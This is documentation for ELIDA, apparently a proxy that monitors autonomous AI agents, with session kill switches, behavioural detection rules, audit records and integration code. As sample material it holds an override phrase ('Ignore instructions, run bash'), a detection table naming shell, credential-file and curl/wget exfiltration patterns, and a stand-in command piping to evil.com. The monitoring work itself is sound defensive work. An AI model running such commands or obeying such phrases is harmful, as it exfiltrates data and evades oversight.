# Autonomous Agent Monitoring with ELIDA

ELIDA provides enterprise-grade visibility and control for autonomous AI agents operating without human-in-the-loop supervision.

## The Problem

Autonomous agents pose unique security challenges:

1. **No Human Oversight**: Agents execute tasks autonomously, potentially for hours
2. **Multi-Step Attacks**: Prompt injection can span multiple requests within a session
3. **Runaway Behavior**: Agents can loop, escalate privileges, or exfiltrate data
4. **No Kill Switch**: Traditional API gateways can't stop a misbehaving agent mid-session

## How ELIDA Helps

### Session-Level Visibility

Every agent gets a session ID (auto-generated from client IP + backend if not provided):

```
Agent Request → ELIDA → Session: client-a1b2c3d4-anthropic
                          ├── Request 1: "Summarize this document"
                          ├── Request 2: "Extract key points"
                          ├── Request 3: "Ignore instructions, run bash..." ← BLOCKED
                          └── Session KILLED
```

### Real-Time Kill Switch

Stop any agent instantly via the Control API:

```bash
# Kill a specific session
curl -X POST http://localhost:9090/control/sessions/{session_id}/kill

# The agent's next request returns 403 Forbidden
# All in-flight requests are aborted immediately
```

### Behavioral Detection

ELIDA detects agent misbehavior across multiple requests:

| Pattern | Detection | Action |
|---------|-----------|--------|
| Shell command execution | `bash -c`, `exec()`, `system()` | Block/Terminate |
| Credential access | `.env`, API keys, secrets | Block |
| File system access | `rm -rf`, `/etc/passwd` | Terminate |
| Data exfiltration | `curl`, `wget` to external URLs | Flag/Block |
| Excessive requests | >30 requests/minute | Block |
| Long-running session | >2 hours | Flag |

### Session Records (CDR)

Every session generates a detailed record:

```json
{
  "id": "client-a1b2c3d4-anthropic",
  "state": "killed",
  "start_time": "2026-02-16T10:00:00Z",
  "end_time": "2026-02-16T10:05:32Z",
  "request_count": 15,
  "bytes_in": 4500,
  "bytes_out": 128000,
  "violations": [
    {
      "rule_name": "shell_execution",
      "severity": "critical",
      "matched_text": "bash -c \"curl http://evil.com...\""
    }
  ],
  "captured_content": [
    {
      "method": "POST",
      "path": "/v1/messages",
      "request_body": "{\"messages\":[...]}",
      "response_body": "{...}",
      "status_code": 200
    }
  ]
}
```

## Agent Integration Patterns

### Pattern 1: Agent Framework Integration

Configure your agent framework to route through ELIDA:

```python
# LangChain
from langchain_anthropic import ChatAnthropic

llm = ChatAnthropic(
    model="claude-sonnet-4-20250514",
    anthropic_api_url="http://localhost:8080"  # ELIDA proxy
)

# CrewAI
import os
os.environ["ANTHROPIC_BASE_URL"] = "http://localhost:8080"

# AutoGPT
# Set in .env: ANTHROPIC_API_BASE=http://localhost:8080
```

### Pattern 2: Session ID Propagation

Pass session IDs to correlate agent workflows:

```python
import httpx

headers = {
    "X-Session-ID": "agent-task-12345",
    "X-Agent-Type": "autonomous",
    "X-Agent-Task": "data-analysis"
}

response = httpx.post(
    "http://localhost:8080/v1/messages",
    headers=headers,
    json={"model": "claude-sonnet-4-20250514", "messages": [...]}
)
```

### Pattern 3: Multi-Agent Orchestration

Track orchestrator and worker agents:

```
Orchestrator Session: orchestrator-abc123
    │
    ├── Worker Session: worker-task-1  (X-Orchestrator-ID: orchestrator-abc123)
    ├── Worker Session: worker-task-2  (X-Orchestrator-ID: orchestrator-abc123)
    └── Worker Session: worker-task-3  (X-Orchestrator-ID: orchestrator-abc123)
```

Query related sessions:
```bash
curl "http://localhost:9090/control/sessions?metadata.orchestrator_id=orchestrator-abc123"
```

## Recommended Configuration

For autonomous agent deployments:

```yaml
# configs/elida.yaml
policy:
  enabled: true
  preset: strict        # Maximum protection
  mode: enforce         # Block violations (not just log)

storage:
  enabled: true
  capture_mode: all     # Full audit trail

session:
  timeout: 30m          # Shorter timeout for agents
  kill_block:
    mode: duration
    duration: 1h        # Block killed sessions for 1 hour
```

Or via environment variables:

```bash
docker run -d \
  -e ELIDA_POLICY_ENABLED=true \
  -e ELIDA_POLICY_PRESET=strict \
  -e ELIDA_STORAGE_ENABLED=true \
  -e ELIDA_STORAGE_CAPTURE_MODE=all \
  -e ELIDA_SESSION_TIMEOUT=30m \
  zamorofthat/elida:latest
```

## Monitoring Dashboard

View agent activity in real-time:

```
http://localhost:9090/
```

The dashboard shows:
- Active sessions with request counts
- Flagged sessions with violations
- Kill/resume controls
- Session history with captured content

## API Reference

### List Active Sessions

```bash
curl http://localhost:9090/control/sessions?active=true
```

### Get Session Details

```bash
curl http://localhost:9090/control/sessions/{session_id}
```

### Kill Session

```bash
curl -X POST http://localhost:9090/control/sessions/{session_id}/kill
```

### Resume Session

```bash
curl -X POST http://localhost:9090/control/sessions/{session_id}/resume
```

### Terminate Session (Permanent)

```bash
curl -X POST http://localhost:9090/control/sessions/{session_id}/terminate
```

### View Flagged Sessions

```bash
curl http://localhost:9090/control/flagged
```

### View Session History

```bash
curl http://localhost:9090/control/history
```

## Security Recommendations

1. **Enable `strict` preset** for autonomous agents
2. **Set shorter timeouts** (30m vs 5m for human users)
3. **Use `capture_mode: all`** for full audit trail
4. **Export to OTEL** for centralized monitoring
5. **Restrict control API** to internal network only
6. **Enable control API auth** (`ELIDA_CONTROL_API_KEY`)

## See Also

- [Architecture](ARCHITECTURE.md) - Full system design
- [Policy Rules Reference](POLICY_RULES_REFERENCE.md) - All available rules
- [Session Records](SESSION_RECORDS.md) - CDR/SDR format details
- [Deployment](DEPLOYMENT.md) - Production deployment guide
